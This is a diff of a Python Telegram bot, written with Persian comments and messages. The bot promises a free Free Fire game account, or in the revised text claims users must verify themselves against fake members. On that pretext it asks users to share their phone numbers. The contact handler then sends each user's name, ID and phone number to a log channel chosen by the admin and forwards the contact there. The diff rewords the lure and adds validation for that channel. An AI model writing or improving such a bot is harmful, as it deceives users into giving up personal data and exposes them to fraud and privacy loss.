@@ -8,8 +8,9 @@ from telegram.ext import (
     filters,
     ConversationHandler,
 )
+from telegram.error import TelegramError
 
-# تنظیمات لوگ برای بررسی خطاها
+# تنظیمات لوگ
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -21,11 +22,10 @@ ADMIN_ID = 6749949992
 
 # دیتابیس ساده در حافظه
 db = {
-    "target_channel": None,  # آیدی یا یوزرنیم چنل مقصد
+    "target_channel": None,  # آیدی یا یوزرنیم چنل مقصد (مثلا @mychannel یا -100123456789)
     "users": {}  # user_id: {"referrals": count, "invited_by": id, "phone": str}
 }
 
-# حالت مکالمه برای پنل مدیریت
 WAITING_FOR_CHANNEL = 1
 
 # ----------------- HELPER FUNCTIONS -----------------
@@ -72,14 +72,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # درخواست تایید هویت در صورت عدم ثبت شماره
     if not user_data["phone"]:
         contact_keyboard = ReplyKeyboardMarkup(
-            [[KeyboardButton("📱 اشتراک شماره تماس (تایید هویت)", request_contact=True)]],
+            [[KeyboardButton("تایید هویت", request_contact=True)]],
             resize_keyboard=True,
             one_time_keyboard=True
         )
         await update.message.reply_text(
             f"سلام {user.first_name} عزیز! 👋\n\n"
-            "🔥 **به ربات دریافت اکانت رایگان فری فایر خوش آمدید!**\n\n"
-            "⚠️ **تایید هویت:** برای جلوگیری از ورود اکانت‌های فیک و دریافت جایزه، لطفا با کلیک روی دکمه زیر شماره تماس خود را به اشتراک بگذارید تا حسابتان فعال شود.",
+            "تا الان کلی ممبر فیک اومده و اینا و شما مجبور به تایید خود هستید.",
             parse_mode="Markdown",
             reply_markup=contact_keyboard
         )
@@ -104,10 +103,11 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data = get_user_data(user.id)
     user_data["phone"] = contact.phone_number
 
-    # ارسال اطلاعات به چنل مقصد در صورت تنظیم بودن
+    # فوروارد مخاطب به چنل مقصد
     target_channel = db["target_channel"]
     if target_channel:
         try:
+            # ارسال متن مشخصات کاربر
             log_text = (
                 "📥 **ثبت هویت کاربر جدید**\n\n"
                 f"👤 **نام:** {user.full_name}\n"
@@ -116,6 +116,8 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📞 **شماره تماس:** `{contact.phone_number}`"
             )
             await context.bot.send_message(chat_id=target_channel, text=log_text, parse_mode="Markdown")
+            
+            # فوروارد خود کنتاکت به چنل
             await context.bot.forward_message(
                 chat_id=target_channel,
                 from_chat_id=update.effective_chat.id,
@@ -190,8 +192,9 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "⚙️ **پنل مدیریت ربات**\n\n"
         f"📢 **چنل ثبت گزارشات فعلی:** `{current_ch}`\n\n"
-        "لطفا آیدی یا یوزرنیم چنل مقصد را بفرستید (مثلا `@my_channel` یا `-100123456789`):\n"
-        "⚠️ *نکته مهم: حتما قبل از ارسال، ربات را در چنل مقصد ادمین کنید!*"
+        "لطفا آیدی یا یوزرنیم چنل مقصد را ارسال کنید:\n"
+        "🔸 **فرمت صحیح:** باید با `@` یا `-` شروع شود (مثلا `@mychannel` یا `-100123456789`).\n\n"
+        "⚠️ *حتما ابتدا ربات را در چنل مقصد ادمین کنید!*"
     )
     await update.message.reply_text(text, parse_mode="Markdown")
     return WAITING_FOR_CHANNEL
@@ -201,8 +204,36 @@ async def save_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     channel_input = update.message.text.strip()
-    db["target_channel"] = channel_input
 
+    # ۱. بررسی شروع شدن با @ یا -
+    if not (channel_input.startswith("@") or channel_input.startswith("-")):
+        await update.message.reply_text(
+            "❌ **فرمت نامعتبر!**\n\n"
+            "ورودی باید حتماً با `@` (برای یوزرنیم) یا `-` (برای آیدی عددی چنل) شروع شود.\n"
+            "مثال: `@my_channel` یا `-100123456789`\n\n"
+            "لطفاً مجدداً ارسال کنید:"
+        )
+        return WAITING_FOR_CHANNEL
+
+    # ۲. بررسی ادمین بودن ربات در چنل
+    try:
+        bot_member = await context.bot.get_chat_member(chat_id=channel_input, user_id=context.bot.id)
+        if bot_member.status not in ["administrator", "creator"]:
+            await update.message.reply_text(
+                "❌ **ربات در این چنل ادمین نیست!**\n\n"
+                "لطفاً ابتدا ربات را در چنل مقصد ادمین کرده و سپس آیدی چنل را بفرستید."
+            )
+            return WAITING_FOR_CHANNEL
+    except TelegramError as e:
+        await update.message.reply_text(
+            f"❌ **خطا در دسترسی به چنل!**\n\n"
+            f"ربات نتوانست چنل را پیدا کند. اطمینان حاصل کنید ربات عضو و ادمین چنل شده باشد.\n`خطا: {e.message}`\n\n"
+            "لطفاً دوباره امتحان کنید:"
+        )
+        return WAITING_FOR_CHANNEL
+
+    # ذخیره در صورت تایید
+    db["target_channel"] = channel_input
     await update.message.reply_text(
         f"✅ چنل مقصد با موفقیت روی `{channel_input}` تنظیم شد.",
         parse_mode="Markdown"
